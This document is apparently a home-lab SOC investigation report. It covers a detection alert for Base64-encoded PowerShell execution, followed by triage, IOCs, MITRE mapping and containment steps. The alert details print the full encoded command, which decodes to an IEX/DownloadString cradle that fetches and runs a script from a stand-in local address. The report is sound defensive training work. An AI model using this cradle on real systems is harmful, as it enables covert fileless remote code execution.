# Scenario 4 — PowerShell Obfuscation Detection Investigation

## Overview

This scenario investigates a high-severity detection alert involving suspicious PowerShell process execution and command-line obfuscation on an endpoint. The simulation evaluates the SIEM's ability to ingest Sysmon Event ID 1 telemetry and detect encoded execution flags used to mask download cradles. The objective was to validate rule fidelity, decode the obfuscated payload to assess malicious intent, and execute standard SOC triage and containment workflows.

---

## Alert Information

| Field | Value |
| --- | --- |
| Alert Name | PowerShell Obfuscation - Encoded Command Execution |
| Date/Time | Sep 10, 2026 @ 10:08:54.943 |
| Severity | High |
| Risk Score | 73 |
| Source Host | 10.0.0.4 |
| Destination | 10.0.0.4 |

---

## Attack Description

PowerShell obfuscation is a defense evasion technique where command syntax, strings, or entire scripts are encoded or modified to bypass signature-based detection and command-line monitoring. Threat actors leverage native PowerShell parameters such as `-EncodedCommand` to pass Base64-encoded UTF-16LE strings directly to the interpreter. In this specific scenario, an adversary used an obfuscated download cradle combining `Invoke-Expression` (`IEX`) with `Net.WebClient.DownloadString` to fetch and execute a remote script entirely in memory without writing artifacts to disk. This fileless delivery mechanism was designed to evade perimeter inspection and establish remote execution while concealing the source code from endpoint analysts.

---

## What I Found in the Logs

The SIEM detected a Sysmon Event ID 1 (Process Creation) indicating a parent powershell.exe process spawned a secondary powershell.exe process. The CommandLine field contained the -EncodedCommand flag followed by a Base64-encoded string. Upon decoding, the command attempted to download and execute a remote payload using Invoke-Expression (IEX) and Net.WebClient.DownloadString. Endpoint logs confirmed that the download was unsuccessful and failed with a connection error.

### Evidence — Kibana Discover

<img width="1920" height="924" alt="ss1" src="https://github.com/user-attachments/assets/1e382df7-89b3-4566-bae1-def494672849" />


<img width="787" height="827" alt="ss2" src="https://github.com/user-attachments/assets/790f4cb9-ef3b-4613-a719-0b80446797d8" />

---

## True Positive or False Positive

**Classification:** True Positive (TP)

### Why?

PowerShell obfuscation using the -EncodedCommand flag is specifically designed to conceal malicious intent and evade basic security inspection tools. The decoded command attempted to download and execute a remote script using IEX and DownloadString, which is a classic fileless malware execution technique. Even though the download failed due to a network connection error, the execution of obfuscated cradle commands indicates active host compromise attempts requiring immediate containment.

### Evidence — Detection Alert Generated

<img width="1672" height="824" alt="ss3" src="https://github.com/user-attachments/assets/57f5e899-3e1b-4ca5-ba87-9c4c3d6e98a8" />

<img width="746" height="704" alt="ss4" src="https://github.com/user-attachments/assets/e1357bdd-82b0-4fdc-8546-3ff717ab4b56" />

---

## Alert Details

- Source Host: 10.0.0.4
- Source Process: `C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe`
- Target Process: `C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe`
- Targeted Account: `WINDOWS-VICTIM\victim`
- SHA256 Hash: `9785001B0DCF755EDDB8AF294A373C0B87B2498660F724E76C4D53F9C217C7A3`
- CommandLine: `powershell.exe -EncodedCommand aQBlAHgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAAnAGgAdAB0AHAAOgAvAC8AMQAyADcALgAwAC4AMAAuADEAJwApAA==`

---

## Indicators of Compromise (IOCs)

| IOC Type | Value |
| --- | --- |
| Host IP | 10.0.0.4 |
| Tool / Parent Process | `C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe` |
| Target Process | `C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe` |
| Targeted Account | `WINDOWS-VICTIM\victim` |
| SHA256 Hash | `9785001B0DCF755EDDB8AF294A373C0B87B2498660F724E76C4D53F9C217C7A3` |
| CommandLine | `powershell.exe -EncodedCommand aQBlAHgA...` |

---

## MITRE ATT&CK Mapping

| Tactic | Technique |
| --- | --- |
| TA0002 – Execution | T1059 – Command and Scripting Interpreter |
| TA0002 – Execution | T1059.001 – PowerShell |
| TA0005 – Defense Evasion | T1027 – Obfuscated Files or Information |

---

## Actions Taken

- Isolated the affected endpoint (10.0.0.4) from the network to prevent lateral movement.
- Locked the compromised user account (WINDOWS-VICTIM\victim) and initiated a password reset.
- Blocked the remote malicious IP address and staging server URL on perimeter firewalls and proxies.
- Scoped the environment in the SIEM to confirm no other endpoints executed the same command line or communicated with the external staging server.
- Assigned security awareness training to the affected employee.

---

## Lessons Learned

- Sysmon ProcessCreate (Event ID 1) rules must include multiple PowerShell parameter abbreviations such as -enc, -e, and -encoded to catch all obfuscation variants.
- Enable PowerShell Script Block Logging (Event ID 4104) and Module Logging across all endpoints to capture de-obfuscated script content directly in memory.
- Enforce PowerShell Constrained Language Mode (CLM) and restrict execution permissions for standard user accounts.
- Conduct regular security awareness training to reduce the risk of phishing attacks that lead to initial endpoint compromise.

---

## Conclusion

The investigation confirmed a True Positive PowerShell obfuscation attack where a parent PowerShell process spawned a child process executing a Base64-encoded download cradle. Although the download failed due to a connection error, the technique represents an active attempt at fileless malware execution. The incident was classified as High severity, and the threat was neutralized through immediate host isolation, account containment, and network-level blocking.

---

## Previous in this series

⬅ [Scenario 3 — LSASS Memory Access Detection Investigation](scenario3%20-%20lsass%20mimikatz%20investigation.md)
